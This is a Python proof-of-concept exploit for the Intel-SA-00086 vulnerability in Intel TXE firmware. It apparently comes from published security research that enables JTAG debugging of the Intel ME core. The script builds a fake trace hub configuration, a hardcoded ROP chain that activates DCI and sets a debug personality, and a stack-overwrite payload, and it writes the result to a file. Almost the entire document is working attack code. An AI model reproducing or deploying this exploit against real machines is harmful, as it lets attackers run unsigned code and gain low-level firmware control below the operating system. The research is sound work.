#!/usr/bin/env python
# JTAG activator for Intel ME core via Intel-SA-00086 by  Mark Ermolov (@_markel___)
#                                                         Maxim Goryachy (@h0t_max)
#
# Details:  https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00086.html
#           http://blog.ptsecurity.com/2018/01/running-unsigned-code-in-intel-me.html
#           https://github.com/ptresearch/IntelME-JTAG

from __future__ import print_function
import argparse
import struct

descr = "Intel-SA-00086 JTAG-PoC for TXE (ver. 3.0.1.1107)"
STACK_BASE = 0x00056000
SYSLIB_CTX_OFFSET = 0x10
STACK_OFFSET = 0x14
BUFFER_OFFSET = 0x380
SYS_TRACER_CTX_OFFSET = 0x200
SYS_TRACER_CTX_REQ_OFFSET = 0x55c58
RET_ADDR_OFFSET = 0x338


def GenerateTHConfig():
    print("[*] Generating fake tracehub configuration...")
    trace_hub_config   = struct.pack("<B", 0x0)*6
    trace_hub_config  += struct.pack("<H", 0x2)
    trace_hub_config  += struct.pack("<L", 0x020000e0)
    trace_hub_config  += struct.pack("<L", 0x5f000000)
    trace_hub_config  += struct.pack("<L", 0x02000010)
    trace_hub_config  += struct.pack("<L", 0x00000888)

    return trace_hub_config

def GenerateRops(rop_address):
    print("[*] Generating rops...")
    #mapping DCI
    rops  = struct.pack("<L", 0x0004a76c) #side-band mapping 
    rops += struct.pack("<L", 0x0004a877) #pop 2 arguments
    rops += struct.pack("<L", 0x000706a8) #param 2
    rops += struct.pack("<L", 0x00000100) #param 1
    
    #activating DCI
    rops += struct.pack("<L", 0x000011BE) #put_sel_word
    rops += struct.pack("<L", 0x0004a876) #pop 3 arguments
    rops += struct.pack("<L", 0x0000019f) #param 3
    rops += struct.pack("<L", 0x00000000) #param 2
    rops += struct.pack("<L", 0x00001010) #param 1
    
    #activating DfX-agg
    rops += struct.pack("<L", 0x0004a76c) #side-band mapping 
    rops += struct.pack("<L", 0x0004a877) #pop 2 arguments
    rops += struct.pack("<L", 0x00070684) #param 2
    rops += struct.pack("<L", 0x00000100) #param 1
    
    #setting personality
    rops += struct.pack("<L", 0x000011BE) #put_sel_word
    rops += struct.pack("<L", 0x0004a876) #pop 3 arguments
    rops += struct.pack("<L", 0x0000019f) #param 3
    rops += struct.pack("<L", 0x00008400) #param 2
    rops += struct.pack("<L", 0x00000003) #param 1

    #rops += struct.pack("<L", 0x0000a82d) # infinite loop
    # Restore trace hub MMIO data
    rops += struct.pack("<L", 0x000011BE) #put_sel_word
    rops += struct.pack("<L", 0x0004a876) #pop 3 arguments
    rops += struct.pack("<L", 0x000000BF) #param 3
    rops += struct.pack("<L", 0x000000E0) #param 2
    rops += struct.pack("<L", 0x00000000) #param 1
    
    rops += struct.pack("<L", 0x000011BE) #put_sel_word
    rops += struct.pack("<L", 0x0004a876) #pop 3 arguments
    rops += struct.pack("<L", 0x000000BF) #param 3
    rops += struct.pack("<L", 0x00000010) #param 2
    rops += struct.pack("<L", 0x88888888) #param 1
    
    rops += struct.pack("<L", 0x0000b578) # Pop 6 arguments
    
    rops += struct.pack("<L", 0x00055ff0) # edx
    rops += struct.pack("<L", 0x00099010) #ecx
    rops += struct.pack("<L", 0x00000000)*4 # ebx, esi, edi, ebp
    rops += struct.pack("<L", 0x00009dcc) # mov [edx], ecx + pop 3 arguments (Restores SYSLIB Context address)
    rops += struct.pack("<L", 0x00000000)*3 # ebx, esi, ebp
    rops += struct.pack("<L", 0x0000b57a) # Pop 4 arguments
    rops += struct.pack("<L", 0x00000000) # ebx
    rops += struct.pack("<L", 0x00000001) # esi (array index)
    rops += struct.pack("<L", 0x00050004) # edi - bup_init_scripts.second_array
    #rops += struct.pack("<L", 0x00055d34) # ebp - TODO needs to be dependent on current position
    rops += struct.pack("<L", rop_address + len(rops) + 0x18) # ebp
    rops += struct.pack("<L", 0x00035674) # continue bip initialization after call to bup_init_trace_hub
    rops += struct.pack("<L", 0x00000000)*4 # 4 values pushed to stack in #355E0
    #rops += struct.pack("<L", 0x00055d3c) # ebp - TODO needs to be dependent on current position
    rops += struct.pack("<L", rop_address + len(rops) + 0x8) # ebp
    rops += struct.pack("<L", 0x00035015) # Return to called
    rops += struct.pack("<L", 0x00000000) # ebp for bup_entry
    rops += struct.pack("<L", 0x000260A1)

    return rops

def GenerateShellCode():
    syslib_ctx_start = SYS_TRACER_CTX_REQ_OFFSET - SYS_TRACER_CTX_OFFSET
    print("[*] Generating SYSLIB_CTX struct (stack base: %x: syslib ctx base: %x)..." % (STACK_BASE, syslib_ctx_start))
    data  = GenerateTHConfig()
    init_trace_len = len(data)
    data += GenerateRops(STACK_BASE - BUFFER_OFFSET + init_trace_len)
    data += struct.pack("<B", 0x0)*(RET_ADDR_OFFSET - len(data))
    data += struct.pack("<L", 0x00016e1a) 
    data += struct.pack("<L", STACK_BASE - BUFFER_OFFSET + init_trace_len)

    data_tail = struct.pack("<LLLLL", 0, syslib_ctx_start,  0, 0x03000300, STACK_BASE-4)
    data += struct.pack("<B", 0x0)*(BUFFER_OFFSET - len(data) - len(data_tail))
    data += data_tail
    return data

def ParseArguments():
    parser = argparse.ArgumentParser(description=descr)
    parser.add_argument('-f', metavar='<file name>', help='file name', type=str, default="ct.bin")
    return parser.parse_args().f

def main():
    print(descr)
    file_name = ParseArguments()
    data = GenerateShellCode()
    print("[*] Saving to %s..." % (file_name))
    f = open(file_name, "wb")
    f.write(data)
    f.close
    
if __name__=="__main__":
    main()
